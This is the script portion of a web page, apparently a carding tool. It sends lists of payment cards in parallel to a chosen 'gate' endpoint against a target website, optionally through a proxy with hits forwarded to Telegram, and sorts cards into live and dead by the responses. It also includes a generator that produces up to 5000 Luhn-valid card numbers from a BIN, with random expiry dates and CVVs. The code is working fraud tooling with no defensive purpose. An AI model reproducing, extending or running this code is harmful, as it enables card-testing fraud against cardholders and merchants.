        function toggleIcon(selector) {
            var icon = $(selector).find('i');
            if (icon.hasClass('fa-eye-slash')) {
                icon.removeClass('fa-eye-slash').addClass('fa-eye');
            } else {
                icon.removeClass('fa-eye').addClass('fa-eye-slash');
            }
        }

        function copyToClipboard(html) {
            var tempDiv = document.createElement("div");
            tempDiv.innerHTML = html;
            document.body.appendChild(tempDiv);
            
            var range = document.createRange();
            range.selectNode(tempDiv);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            
            try {
                var successful = document.execCommand('copy');
                var msg = successful ? 'successful' : 'unsuccessful';
                console.log('Copying text command was ' + msg);
            } catch (err) {
                console.log('Oops, unable to copy', err);
            }
            
            window.getSelection().removeAllRanges();
            document.body.removeChild(tempDiv);
        }

        function showNotification(message) {
            var notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.display = 'block';
            setTimeout(function() {
                notification.style.display = 'none';
            }, 3000);
        }

        let isStopped = false; // Global variable to track the stop state

        async function start() {
            isStopped = false; // Reset stop flag

            // Validate inputs before proceeding
            var lista = $("#lista").val().trim();
            var website = $('#website').val().trim();
            var proxy = $('#proxy').val().trim(); // Capture proxy information
            var telegramForwarder = $('#telegramForwarder').val().trim(); // Capture Telegram Forwarder information

            if (!website) {
            showNotification('Please enter a website URL'); // Show notification for missing website
            return; 
            }

            if (!lista) {
                showNotification('No cards to check'); // Show notification for missing cards
            return;
            }

            if (!proxy) {
            console.log('No proxy provided, continuing without proxy...');
            } else {
            console.log('Using proxy:', proxy);
            }
            if (!telegramForwarder) {
            console.log('No Telegram Forwarder provided, continuing without Telegram forwarding...');
            } else {
            console.log('Using Telegram Forwarder:', telegramForwarder);
            }

            // Show checker box only if all validations pass
            $('#checker-box').show(); // Show the checker box
            $('#checker-started').text('Checker Started').show(); // Reset and show "Checker Started"
            $('#checking-status').text('Checking 0 card/s').show(); // Reset and show "Checking Status"
            $('#checked-icon').removeClass('checked'); // Remove checkmark icon
            $('#spinner').show(); // Show the spinner

            var lines = lista.split("\n");
            var total = lines.length;
            $('#checking-status').text('Checking ' + total + ' card/s'); // Update the status text with the total cards
            var ap = 0, ed = 0, rp = 0;

            setTimeout(function () {
            $('#spinner').hide(); // Hide the spinner after processing
            $('#checker-started').hide(); // Hide "Checker Started" text
            $('#checking-status').hide(); // Hide "Checking Status" text
            $('#checked-icon').addClass('checked'); // Show the checkmark icon
            $('#checker-box').hide(); // Show checkmark

            setTimeout(function () {
            $('#checker-box').hide(); // Hide the checker box after a short delay
                }, 1000); // Add timeout for the checker box
            }, 2000); // Adjust timeout for spinner completion
            const MAX_THREADS = 8;

            async function processCard(value, retries = 3) {
            if (isStopped) return; // Exit if process is stopped

            return new Promise(function (resolve, reject) {
            var gate = $("#gates").val();
            var url = gate + '?lista=' + encodeURIComponent(value) 
               + '&website=' + encodeURIComponent(website) 
               + '&proxy=' + encodeURIComponent(proxy) 
               + '&telegramForwarder=' + encodeURIComponent(telegramForwarder);
            $.ajax({
            url: url,
            type: 'GET',
            async: true,
            success: function (resultado) {
                if (isStopped) return; // Exit if process is stopped

                if (resultado.match("#CVV")) {
                    aprovadas(resultado + "");
                    ap++;
                    document.getElementById('cvv-audio').play();
                } else if (resultado.match("#CCN")) {
                    edrovadas(resultado + "");
                    ed++;
                } else {
                    reprovadas(resultado + "");
                    rp++;
                }

                var checked = ap + ed + rp;
                $('#cLive').html(ap);
                $('#cWarn').html(ed);
                $('#cDie').html(rp);
                $('#total').html(checked);
                $('#cLive2').html(ap);
                $('#cWarn2').html(ed);
                $('#cDie2').html(rp);
                $('#carregadas').html(total);

                removelinha();
                resolve();
            },
            error: function (error) {
                if (isStopped) return; // Exit if process is stopped

                console.error('Error processing card:', error);
                if (retries > 0) {
                    setTimeout(() => {
                        console.log(`Retrying... Attempts left: ${retries - 1}`);
                        processCard(value, retries - 1).then(resolve).catch(reject);
                    }, 1000);
                } else {
                    reject(error);
                }
            }
        });
    });
}
            async function threadPool(lines, maxThreads) {
            let activeThreads = 0;
            let queueIndex = 0;
            return new Promise((resolve, reject) => {
            function nextTask() {
                if (isStopped) {
                    activeThreads = 0;
                    resolve();
                    return;
                }

                if (queueIndex >= lines.length && activeThreads === 0) {
                    resolve();
                    return;
                }

                // Corrected the closure of nextTask
            if (queueIndex < lines.length && activeThreads < maxThreads) {
                activeThreads++;
                const line = lines[queueIndex];
                queueIndex++;

            // Removed redundant recursive call of nextTask inside then/catch
                processCard(line).then(() => {
                activeThreads--;
                nextTask(); // Proceed to the next task after resolving
                    }).catch(() => {
                activeThreads--;
                nextTask(); // Proceed to the next task even after catching an error
                });
            }
        }
            for (let i = 0; i < maxThreads; i++) {
                nextTask();
            }
        });
    }

    threadPool(lines, MAX_THREADS).then(() => {
        if (!isStopped) showNotification('All cards processed successfully.');
    }).catch((err) => {
        console.error('Error during card processing:', err);
    });
}

            function stopProcess() {
                isStopped = true; // Set the stop flag to true
            $('#checker-box').hide(); // Hide the checker box

}

        }

        function edrovadas(str) {
            $(".edrovadas").append(str + "<br>");
        }

        function removelinha() {
            var lines = $("#lista").val().split('\n');
            lines.splice(0, 1);
            $("#lista").val(lines.join("\n"));
        }

        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function padWithZero(number) {
            return number < 10 ? '0' + number : number;
        }

        // Function to generate multiple cards based on the BIN and quantity
        function generateCards() {
    var bin = $('#bin').val().trim();
    var month = $('#month').val().trim();
    var year = $('#year').val().trim();
    var cvv = $('#cvv').val().trim();
    var quantity = parseInt($('#quantity').val().trim());

    // If BIN is not provided, show an error in the upper-right notification
    if (!bin || bin.length < 4) {
        showNotification('Error: Please provide a valid BIN (at least 4 digits)');
        return;
    }

    // Validate the quantity (max 5000) and show an error in the upper-right notification
    if (!quantity || quantity < 1 || quantity > 5000) {
        showNotification('Error: Please provide a valid quantity (1 to 5000)');
        return;
    }

    var generatedCards = [];

    for (var i = 0; i < quantity; i++) {
        // Generate the rest of the card number to make it 16 digits
        var cardBin = bin;
        while (cardBin.length < 15) {
            cardBin += getRandomInt(0, 9);  // Add random digits to BIN
        }

        // Generate Luhn checksum digit for the 16th number
        var cardNumber = generateLuhn(cardBin);

        // Randomize Month if not provided
        var genMonth = month ? month : padWithZero(getRandomInt(1, 12));

        // Randomize Year if not provided
        var genYear = year ? year : getRandomInt(2024, 2034);

        // Randomize CVV if not provided
        var genCvv = cvv ? cvv : padWithZero(getRandomInt(100, 999));  // Random 3-digit CVV

        // Add generated card to the list
        var generatedCard = `${cardNumber}|${genMonth}|${genYear}|${genCvv}`;
        generatedCards.push(generatedCard);
    }

    // Display all generated card details
    $('#lista').val($('#lista').val() + generatedCards.join("\n") + "\n");
    showNotification(quantity + ' Cards Generated.');  // Show success notification
    }
        // Luhn Algorithm to generate the 16th digit (checksum)
        function generateLuhn(number) {
            var arr = (number + '').split('').reverse().map(x => parseInt(x));
            var sum = arr.reduce((acc, val, i) => {
                if (i % 2 !== 0) {
                    val *= 2;
                    if (val > 9) val -= 9;
                }
                return acc + val;
            }, 0);
            var checkDigit = (10 - (sum % 10)) % 10;
            return number + checkDigit;
        }

        // Function to open the Card Generator Modal
        function openCardGenerator() {
            $('#card-generator-box').show();
        }

        // Function to close the Card Generator Modal
        function closeCardGenerator() {
            $('#card-generator-box').hide();
        }
    </script>
</body>
</html>
